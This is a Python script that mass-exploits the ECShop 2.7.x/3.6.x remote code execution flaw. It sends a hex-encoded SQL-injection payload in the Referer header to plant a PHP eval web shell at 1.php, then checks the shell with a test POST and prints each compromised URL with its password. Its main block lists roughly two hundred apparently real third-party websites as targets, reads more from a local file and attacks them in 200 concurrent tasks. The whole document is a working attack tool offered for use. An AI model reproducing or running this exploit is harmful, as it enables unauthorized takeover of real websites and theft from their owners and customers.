from Common import _request
import asyncio
from g import g
import sys

"""
参考文章 
ECShop <= 2.7.x/3.6.x 全系列版本远程代码执行高危漏洞EXP  https://xz.aliyun.com/t/2691
关于ECShop前台注入和getshell漏洞的一些思考  https://xz.aliyun.com/t/2725
ecshop批量程序 python3  https://www.t00ls.net/thread-47523-1-1.html

"""

if sys.platform == 'win32':
    loop = asyncio.ProactorEventLoop()
    asyncio.set_event_loop(loop)


async def expscan(url, response) -> bool:
    if response.status == 200:
        return True
    return False


async def checkshell(url, response) -> bool:
    html = await response.text()
    if "123321123" in html:
        print("url: %s ,password: %s " % (url, "1337"))
        return url + "|1337"
    return False


async def exploit(url: str) -> str:
    referer = "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}"
    # file_put_contents('1.php','<?php eval($_POST[rabbit]);?>')

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
               'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
               'Referer': referer,
               'Accept-Encoding': 'gzip, deflate'
               }

    target_url = url + "/user.php?act=login"
    res = await _request(target_url, expscan, "GET", headers=headers, ssl=False)
    shell = ''
    if res:
        await asyncio.sleep(2)
        payload = {'1337': 'echo 123321123;'}
        shell = await _request(url + "/1.php", checkshell, "POST", data=payload)
    return shell


if __name__ == '__main__':
    url_list = ['http://leonheimaan.com', 'http://fs6876.com', 'http://www.cktie.com']
    aa = ['http://jwzdhxn.blog.163.com', 'https://zhidao.baidu.com', 'http://www.cbkshop.com', 'http://itbyc.com',
          'http://sydiannao.com', 'https://wenku.baidu.com', 'http://www.ubabytv.com.cn', 'http://zf880812.com',
          'http://www.gzwangbai.com', 'http://www.discuz.net', 'https://www.wenkuxiazai.com',
          'http://www.ecshopjcw.com', 'http://www.susidi.com', 'http://qsylkj.top', 'http://www.smhero.net',
          'http://www.bjlink.com', 'http://www.fishfx.cn', 'http://yiyiartssales.com', 'http://www.yueshi89.com',
          'https://www.wenkuxiazai.com', 'http://shop.koyoele.com.cn', 'http://wenqianba.com',
          'http://www.jiazheng52.cn', 'http://www.wiseno.com', 'http://www.hao686.top', 'http://www.voidcn.com',
          'http://singjikging.com', 'http://yzspy.com', 'http://yzspy.com', 'http://www.smhero.net',
          'http://shop.chinaconsol.com', 'http://imomentimages.com', 'http://tosuoa.com', 'http://www3.ecmoban.com',
          'https://www.bbsmax.com', 'http://hemiaodian.com', 'http://skydream516.com', 'http://www.gzwangbai.com',
          'http://zhuhsqgkjyxgs.com', 'http://lezengtrading.com', 'http://www.ecshop119.com',
          'http://longtengyongshun.com', 'http://lhsrshop.com', 'http://jiuhecel.com', 'http://pay6668a.com',
          'http://ddcl89.com', 'http://www.cnblogs.com', 'http://gzjinp.com', 'http://www.ecshop.com',
          'http://www.cnblogs.com', 'http://yinhuibaobuy.com', 'http://xibaoshiyu.com', 'https://jingyan.baidu.com',
          'http://5555zw.com', 'http://jiadic.com', 'https://blog.csdn.net', 'http://ezon2u.com', 'http://lrkejii.com',
          'http://ntzrj513.blog.163.com', 'http://gslfaye.blog.163.com', 'http://yxd8889.com', 'http://xint789.com',
          'http://bbs.ecshop.com', 'http://haitongky.com', 'https://zhidao.baidu.com', 'http://www.midoujingling.com',
          'http://bbs.ecshop.com', 'http://gzjcfs1.com', 'http://ayukeji.com', 'http://down.admin5.com',
          'http://zjedianz.com', 'http://rrxkmy.com', 'http://saihuai965.com', 'http://www.qingtaob2b.com',
          'http://wenqianba.com', 'https://wenku.baidu.com', 'https://yq.aliyun.com', 'http://www.fadake.com',
          'https://bbs.csdn.net', 'http://www.tjjinhua.net', 'http://ffyyoo.top', 'http://www.yunxianghui.com',
          'http://www.66247.xyz', 'http://shop.zgzkw.com', 'http://bhwlkjtz.com', 'https://www.bbsmax.com',
          'http://www.qianhechaoshi.com', 'http://www.tangparadise.cn', 'http://www.fadake.com', 'http://frtouzi.com',
          'http://blog.sina.com.cn', 'http://www.tianjiaochafang.com', 'https://yq.aliyun.com',
          'http://blog.sina.com.cn', 'http://sys996.com', 'http://litenlife.com', 'http://down.admin5.com',
          'http://leonheimaan.com', 'https://blog.csdn.net', 'http://www.rrsmao.com', 'http://jingyan.baidu.com',
          'http://bjtrfskj2.com', 'http://gftrandltd.com', 'http://ddxj89.com', 'http://www.eiyong.com',
          'http://gsmxycb.com', 'http://gwjs1.com', 'http://shoufuanz.com']
    bb = ['http://www.shopex.cn', 'http://bbs.shopex.cn', 'http://www.cnblogs.com', 'http://www.cnblogs.com',
          'https://www.tuicool.com', 'http://www.codespu.com', 'https://wenku.baidu.com', 'http://www.bitscn.com',
          'http://www.yunsec.net', 'http://www.doc88.com', 'http://www.shopex.cn', 'http://bbs.shopex.cn',
          'http://www.cnblogs.com', 'http://www.cnblogs.com', 'https://www.tuicool.com', 'http://www.codespu.com',
          'https://wenku.baidu.com', 'http://www.bitscn.com', 'http://www.yunsec.net', 'http://www.doc88.com',
          'http://www.shopex.cn', 'http://bbs.shopex.cn', 'http://www.cnblogs.com', 'http://www.cnblogs.com',
          'https://www.tuicool.com', 'http://www.codespu.com', 'https://wenku.baidu.com', 'http://www.bitscn.com',
          'http://www.yunsec.net', 'http://www.doc88.com', 'http://bubuko.com', 'http://www.zuimoban.com',
          'https://wenku.baidu.com', 'http://www.5kik.com', 'http://www.vfocus.net', 'https://www.87994.com',
          'http://www.shopex.cn', 'http://bbs.shopex.cn', 'http://www.cnblogs.com', 'http://www.cnblogs.com',
          'https://www.tuicool.com', 'http://www.codespu.com', 'http://www.bitscn.com', 'http://www.yunsec.net',
          'http://www.doc88.com', 'http://www.th7.cn']
    cc = ['http://www.bake888.cn', 'http://weiyingqq.com', 'http://www.audio-audio.com', 'http://www.minko.cn',
          'http://maifengwangluo.com', 'http://gzjinp.com', 'http://shop.rdctm.com', 'http://www.dshfood.com',
          'http://jiadic.com', 'http://www.jiazheng52.cn', 'http://www.zhongchengzichan.com',
          'http://www.midoujingling.com', 'http://ht-tz.cn', 'http://smartlife.com.cn', 'http://www3.ecmoban.com',
          'http://www.polo-cloud.com', 'http://www.bjlink.com', 'http://uniteyoush.com', 'http://daxiangxiaojia.com',
          'http://pnsn.com.cn', 'http://shop.chinaconsol.com', 'http://en.waterforex.com', 'http://shop.ocedu.cn',
          'http://www.secuage.com', 'http://hndzyx.com', 'http://ea.waterforex.com', 'http://jiuhecel.com',
          'http://www.cnblogs.com', 'http://www.shdanheind.com', 'http://shop.qinziqie.com', 'http://www.ecshop.com',
          'http://www.fivicschina.com', 'https://jingyan.baidu.com', 'http://www.fadake.com', 'http://lrkejii.com',
          'http://litenlife.com', 'http://www.wiseno.com', 'http://shop.koyoele.com.cn', 'http://pandakorea.com',
          'http://www.cbkshop.com', 'http://www.julijf.com', 'http://enlern.cn', 'http://www.ecshop119.com',
          'http://99goal.com', 'http://www.jiufuhui.com', 'http://5555zw.com', 'http://www.jianzhan01.com',
          'http://ancson.com', 'http://mall.zgyobel.com', 'http://shop.boy-toy.net']
    dd = ['http://www.cqbiyun.com', 'http://www.condormart.com', 'http://www.conferl.com', 'http://www.code250.com',
          'http://www.comxe.com',
          'http://www.cokisushi.fr', 'http://www.cyjptl.cn', 'http://www.cnbooks.com', 'http://www.cn5637.com',
          'http://www.cn-and.com',
          'http://www.clio365.com', 'http://www.concertarts.com', 'http://www.cityenglish.org', 'http://www.citycb.com',
          'http://www.cktie.com', 'http://www.ckhoney.com', 'http://www.chuyigou.com', 'http://www.chiaoyo.com',
          'http://www.chengrenlove.com', 'http://www.chakefang.com', 'http://www.cha899.com', 'http://www.cdkjbg.com',
          'http://www.cdlkj.com',
          'http://www.cctv-tw.com']
    with open("C:\\Users\\axjc\\Desktop\\xxx.txt","r") as f:
        test = f.read().split("\n")
    res = []
    for x in test:
        res.append("http://"+x)

    g['semaphore'] = asyncio.Semaphore(200)
    loop = asyncio.get_event_loop()
    tasks = []
    for url in res:
        task = loop.create_task(exploit(url))
        tasks.append(task)
    loop.run_until_complete(asyncio.gather(*tasks))
